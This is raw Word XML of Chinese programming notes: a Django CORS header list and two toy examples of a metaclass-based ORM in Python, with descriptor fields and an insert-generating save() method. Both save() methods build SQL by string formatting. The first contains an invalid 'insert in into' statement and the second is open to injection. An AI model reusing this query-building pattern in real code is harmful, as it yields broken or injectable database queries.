    <w:p w14:paraId="74D817C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2115B0F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设置请求头</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5833FB6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CORS_ALLOW_HEADERS = (</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D3FA2C9"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'XMLHttpRequest',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D54DE1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'X_FILENAME',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BD9403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'accept-encoding',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0880933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'authorization',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="479C3863"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'content-type',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F2C098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'dnt',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6776588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'origin',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="422F471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'user-agent',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AC7874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'x-csrftoken',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="439DE95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'x-requested-with',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C0E799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'Pragma',</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="725A6EEA" w14:textId="1DED0143" w:rsidR="008B2E56"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09D11B4B" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00C51947" w:rsidRDefault="00D96E02" w:rsidP="00870C85">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="36"/>
          <w:sz w:val="42"/>
          <w:szCs w:val="42"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId114" w:history="1">
        <w:r w:rsidR="00870C85" w:rsidRPr="00C51947">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
            <w:color w:val="333333"/>
            <w:kern w:val="36"/>
            <w:sz w:val="42"/>
            <w:szCs w:val="42"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>通过元类简单的实现一个类似于</w:t>
        </w:r>
        <w:r w:rsidR="00870C85" w:rsidRPr="00C51947">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
            <w:color w:val="333333"/>
            <w:kern w:val="36"/>
            <w:sz w:val="42"/>
            <w:szCs w:val="42"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>django</w:t>
        </w:r>
        <w:r w:rsidR="00870C85" w:rsidRPr="00C51947">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
            <w:color w:val="333333"/>
            <w:kern w:val="36"/>
            <w:sz w:val="42"/>
            <w:szCs w:val="42"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>的</w:t>
        </w:r>
        <w:r w:rsidR="00870C85" w:rsidRPr="00C51947">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
            <w:color w:val="333333"/>
            <w:kern w:val="36"/>
            <w:sz w:val="42"/>
            <w:szCs w:val="42"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>orm</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3610B4C9" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00C51947" w:rsidRDefault="00870C85" w:rsidP="00870C85">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="150" w:after="150" w:line="30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既然提到元类，那么什么是元类？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39F440C3" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00C51947" w:rsidRDefault="00870C85" w:rsidP="00870C85">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="150" w:after="150" w:line="30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元类也就是创造类的类，在</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>python</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>type</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>就是一个元类</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A654617" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00C51947" w:rsidRDefault="00870C85" w:rsidP="00870C85">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="150" w:after="150" w:line="30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要实现</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>django</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>中的</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>orm</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，首先要了解属性描述符，下面给出两个属性描述符</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A3EC49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Field:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65096FD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min_lenth, max_lenth):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="361526E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self.min_lenth = min_lenth</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64837AC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self.max_lenth = max_lenth</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23095FD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min_lenth &gt;= max_lenth:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39AD614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ValueError("最小值应该比最大值小")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B7A2C9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InField(Field):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="290DC5D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"""数据描述符"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="106AD3C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min_lenth, max_lenth):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D4AF52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None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FAC733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super(InField, self).__init__(min_lenth, max_lenth)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45CC39A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__get__(self, instance, owner):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46CD8D1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self._value</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56A9C29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__set__(self, instance, value):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="499B90B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isinstance(value, numbers.Integral):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="700AD51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self.min_lenth:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A9D46F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value &lt; self.min_lenth:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EB9595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ValueError("必须大于等于最小值")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17A4202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self.max_lenth:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E71C2E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value &gt; self.max_lenth:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D4E9F6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ValueError("必须小于最大值")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C465F4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value</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02C2025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else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67E1358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ValueError("参数必须输一个int类型")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45D0298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__delete__(self, instance):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DD71A6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pass</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="201DD2B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CharField(Field):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="332A824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"""数据描述符"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00D429D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def __init__(self, min_lenth, max_lenth):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6657083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None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33E2BBF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super(CharField, self).__init__(min_lenth, max_lenth)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C50AD9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__get__(self, instance, owner):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E207E0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self._value</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F8FBC4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__set__(self, instance, value):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="683661D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value</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0954F0A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__delete__(self, instance):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AA0948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pass</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D6DD2EF" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00C51947" w:rsidRDefault="00870C85" w:rsidP="0095285B">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="36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编写一个元类，这里要讲的就是，既然我们要用元类创建一个类，那么当我们创建这个类的对象的时候用</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>__new__</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>这个魔法函数去控制实例化，在其中注入一些属性</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1941EBE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BaseModel(type):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11039E9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"""因为继承了type,那么BaseMode就是一个元类"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52E6C32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__new__(cls, name, base, attr, **kwargs):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79D92B3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"""__new__魔法方法控制类的实例化"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B5B055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fields的作用是把我们属于数据描述符的字段抽取出来，最后操作数据的时候用到</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DE7BA7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 = dict()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DE9FA8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key, value in attr.items():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="643C812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isinstance(value, Field):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0032AD6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fields[key] = value</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3332F6C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meta = attr.get("Meta")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4532DAA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db_table = name.lower()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AFB527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meta:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2698A87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data = meta.__dict__</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49834D9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"db_table" in data:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D43B54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db_table = data.get("db_table")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="398F2DF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attr["data"] = data</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44E2C17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del attr["Meta"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A247AD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attr["db_table"] = db_table</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7489AC6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attr["fields"] = fields</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60A7AF8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养成好习惯调用父类的方法返回</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C05AC3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super().__new__(cls, name, base, attr, **kwargs)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20AD1346" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00C51947" w:rsidRDefault="00870C85" w:rsidP="00870C85">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="150" w:after="150"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>创建一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>model</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>父类</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AC934FB" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00C51947"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51947">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="008000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t># 创建这个的原因呢,是因为我们要实现类似django的orm功能，因此，这个类中我们需要写一些操作数据库的方法，这样代码看起来回更加整洁，分离性更加好</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04023EC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Model(metaclass=BaseModel):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="652F179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*args, **kwargs):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AA981C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key, value in kwargs.items():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33E5964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getattr(self, key, None):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09C2DE7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setattr(self, key, value)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13DE19D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save(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A91D19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 = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5722D6E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values = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E9AA96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key, value in self.fields.items():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E62376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fields.append(key)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58F33F0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values.append(str(getattr(self, key)))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06C6EC7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sql = "insert in into {db_table}({fields}) values{values}".format(db_table=self.db_table, fields=",".join(fields), values=",".join(values))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="186AEFD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print(sql)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="597FFE0B" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00C51947" w:rsidRDefault="00870C85" w:rsidP="0095285B">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="36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创建</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>model</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E41DE4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User(Model):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FF88A4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name = CharField(max_lenth=10, min_lenth=2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CDCB84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height = InField(max_lenth=300, min_lenth=50)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A956AE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class Meta:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71322EB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指明数据库中的数据表</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D36779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db_table = "用户"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D97EC8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if __name__ == "__main__":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6858A6E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user = User()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C07621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user.name = "witt"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="324B612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user.height = 170</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10DAE99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user = User(name="witt", height=170)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3940FAB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user.save()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CDEE752" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00C51947" w:rsidRDefault="00870C85" w:rsidP="0095285B">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="36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这样就基本实现了一个</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>orm</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63BFE647" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D96E02"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0000FF"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId115" w:history="1">
        <w:r w:rsidR="00870C85" w:rsidRPr="00C51947">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
            <w:color w:val="333333"/>
            <w:kern w:val="36"/>
            <w:sz w:val="42"/>
            <w:szCs w:val="42"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>通过元类简单实现</w:t>
        </w:r>
        <w:r w:rsidR="00870C85" w:rsidRPr="00C51947">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
            <w:color w:val="333333"/>
            <w:kern w:val="36"/>
            <w:sz w:val="42"/>
            <w:szCs w:val="42"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>ORM</w:t>
        </w:r>
        <w:r w:rsidR="00870C85" w:rsidRPr="00C51947">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
            <w:color w:val="333333"/>
            <w:kern w:val="36"/>
            <w:sz w:val="42"/>
            <w:szCs w:val="42"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>中的</w:t>
        </w:r>
        <w:r w:rsidR="00870C85" w:rsidRPr="00C51947">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
            <w:color w:val="333333"/>
            <w:kern w:val="36"/>
            <w:sz w:val="42"/>
            <w:szCs w:val="42"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>insert</w:t>
        </w:r>
        <w:r w:rsidR="00870C85" w:rsidRPr="00C51947">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
            <w:color w:val="333333"/>
            <w:kern w:val="36"/>
            <w:sz w:val="42"/>
            <w:szCs w:val="42"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>功能</w:t>
        </w:r>
        <w:r w:rsidR="00870C85" w:rsidRPr="00C51947">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
            <w:color w:val="333333"/>
            <w:kern w:val="36"/>
            <w:sz w:val="42"/>
            <w:szCs w:val="42"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>(django</w:t>
        </w:r>
        <w:r w:rsidR="00870C85" w:rsidRPr="00C51947">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
            <w:color w:val="333333"/>
            <w:kern w:val="36"/>
            <w:sz w:val="42"/>
            <w:szCs w:val="42"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>必备</w:t>
        </w:r>
        <w:r w:rsidR="00870C85" w:rsidRPr="00C51947">
          <w:rPr>
            <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
            <w:color w:val="333333"/>
            <w:kern w:val="36"/>
            <w:sz w:val="42"/>
            <w:szCs w:val="42"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>)</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5E5CE80A" w14:textId="090A1B24"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ModelMetaclass(type):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D3EAAC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def __new__(cls, name, bases, attrs):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5829E09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mappings = dict()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5999F45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判断是否需要保存</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="023EC41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 v in attrs.items():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CF6233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判断是否是指定的StringField或者IntegerField的实例对象</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49B2B66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isinstance(v, tuple):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="680D473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print('Found mapping: %s ==&gt; %s' % (k, v))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6071FE1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mappings[k] = v</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="102DB4E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删除这些已经在字典中存储的属性</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44813DF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 in mappings.keys():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D32C38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attrs.pop(k)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F83347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将之前的uid/name/email/password以及对应的对象引用、类名字</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37804B5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attrs['__mappings__'] = mappings  # 保存属性和列的映射关系</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FD806F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attrs['__table__'] = name  # 假设表名和类名一致</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D9076A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type.__new__(cls, name, bases, attrs)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A2458E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User(metaclass=ModelMetaclass):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F73824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uid = ('uid', "int unsigned")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D59373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name = ('username', "varchar(30)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32A7B14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email = ('email', "varchar(30)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66483C5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password = ('password', "varchar(30)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C3FD01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当指定元类之后，以上的类属性将不在类中，而是在__mappings__属性指定的字典中存储</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="371FC1B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以上User类中有 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5856CFD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__mappings__ = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="157110F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"uid": ('uid', "int unsigned")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DA5096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"name": ('username', "varchar(30)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F67AD2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"email": ('email', "varchar(30)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="376ABC7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"password": ('password', "varchar(30)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14CCC80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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F232B4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__table__ = "User"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5340487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**kwargs):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6428D8D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name, value in kwargs.items():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E149C1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setattr(self, name, value)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47B5A16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save(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DFD03D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 = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E88534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 = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EEE8E6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for k, v in self.__mappings__.items():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40DAACB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fields.append(v[0])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2020960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args.append(getattr(self, k, None))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D28C1E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args_temp = list()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FA333E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temp in args:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7309EF5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判断入如果是数字类型</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F30BE9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isinstance(temp, int):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C0B9D3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args_temp.append(str(temp))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="149B06F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elif isinstance(temp, str):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A6736B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args_temp.append("""'%s'""" % temp)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04AB673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sql = 'insert into %s (%s) values (%s)' % (self.__table__, ','.join(fields), ','.join(args_temp))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EA3AD8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print('SQL: %s' % sql)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2844FA3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u = User(uid=12345, name='Michael', email='test@orm.org', password='my-pwd')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7941136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print(u.__dict__)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50936D4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u.save()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42D4229F" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00C51947" w:rsidRDefault="00870C85" w:rsidP="0095285B">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="36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执行的效果</w:t>
      </w:r>
      <w:r w:rsidRPr="00C51947">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F4101D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uid ==&gt; ('uid', 'int unsigned')</w:t>
      </w:r>
    </w:p>
